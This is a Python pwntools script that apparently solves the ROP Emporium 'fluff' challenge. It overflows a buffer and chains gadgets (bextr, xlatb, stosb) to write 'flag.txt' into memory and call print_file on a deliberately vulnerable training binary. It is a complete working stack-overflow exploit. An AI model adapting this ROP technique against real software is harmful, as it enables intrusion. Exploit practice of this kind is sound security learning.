#!/usr/bin/env python
from pwn import * 
import struct
import binascii

bin_name = './fluff'

# RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
# Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   65) Symbols	  No	0		0		fluff

# Dump of assembler code for function questionableGadgets:
#    0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
#    0x0000000000400629 <+1>:	ret    
#    0x000000000040062a <+2>:	pop    rdx
#    0x000000000040062b <+3>:	pop    rcx
#    0x000000000040062c <+4>:	add    rcx,0x3ef2
#    0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
#    0x0000000000400638 <+16>:	ret    
#    0x0000000000400639 <+17>:	stos   BYTE PTR es:[rdi],al
#    0x000000000040063a <+18>:	ret    
#    0x000000000040063b <+19>:	nop    DWORD PTR [rax+rax*1+0x0]
# End of assembler dump.

context.clear(arch='amd64')
context.log_level = 'debug'
proc = process(bin_name)

padding_len       = 40

write_loc         = 0x601500 # rw section
pop_rdi           = 0x4006a3 # pop rdi; ret;  
stos_rdi_al       = 0x400639 # stosb byte ptr [rdi], al; ret;
bextr_rbx_rcx_rdx = 0x400633 # bextr rbx, rcx, rdx; ret;
xlatb             = 0x400628 # xlatb; ret;
pop_rdx           = 0x40062a # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;

print_file        = 0x400510 # print_file@plt

payload = padding_len * b'A'

def bextr(rcx, rdx):
    payload = b''
    payload += p64(pop_rdx)
    payload += p64(rdx)
    payload += p64(rcx - 0x3ef2)
    return payload

# ### WRITE ### #

offset = 0x0b

chars = [
    {'char': 'f', 'loc': 0x400552},
    {'char': 'l', 'loc': 0x400239},
    {'char': 'a', 'loc': 0x4003d6},
    {'char': 'g', 'loc': 0x4003cf},
    {'char': '.', 'loc': 0x40024e},
    {'char': 't', 'loc': 0x400192},
    {'char': 'x', 'loc': 0x400246},
    {'char': 't', 'loc': 0x400192}
]

for char_index in range(len(chars)):
    payload += p64(pop_rdi)
    payload += p64(write_loc + char_index)
    payload += bextr(chars[char_index]['loc'] - offset, 0xff00)
    payload += p64(xlatb)
    payload += p64(stos_rdi_al)
    offset = ord(chars[char_index]['char'])

# ### WRITE ### #

payload += p64(pop_rdi)
payload += p64(write_loc)
payload += p64(print_file)

proc.recvuntil('\n> ')
proc.sendline(payload)
log.info('payload: ' + binascii.hexlify(payload).decode('ascii'))
print(proc.recvall().decode('ascii'))
